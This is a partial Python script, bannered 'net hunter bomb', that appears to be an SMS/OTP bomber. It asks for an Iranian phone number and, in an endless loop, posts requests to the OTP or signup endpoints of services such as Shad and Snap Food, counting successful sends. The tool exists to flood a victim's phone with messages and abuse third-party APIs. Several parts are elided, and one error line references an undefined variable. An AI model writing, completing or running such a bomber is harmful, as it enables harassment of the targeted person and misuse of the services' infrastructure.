...
print(Fore.BLUE+custom_fig.renderText('net hunter bomb'))
num = str(Fore.RED+input("enter the number: "))
s = "0" + num.split("98")[1]
s = str(s)
qq = "+" + num
#--------------Shad-----js------#
...
while True:
    ...
    if q.status_code == 200:
        print(Fore.GREEN+'[+]'+Fore.BLUE+' Request Completed successfully !'+Fore.CYAN,i)
        i+=1
    else:
        print(Fore.RED+'[-]'+Fore.YELLOW+' Request failed !'+Fore.RED+' - Error Code : ',e.status_code)
...
#  shad
    ...
    if w.status_code == 200:
        ...
        print(Fore.RED+'[-]'+Fore.YELLOW+' Request failed !'+Fore.RED+' - Error Code : ',w.status_code)
...
#  SNAP FOOD
    r = requests.post(urlRU, headers=hedRU, json=jcRU)
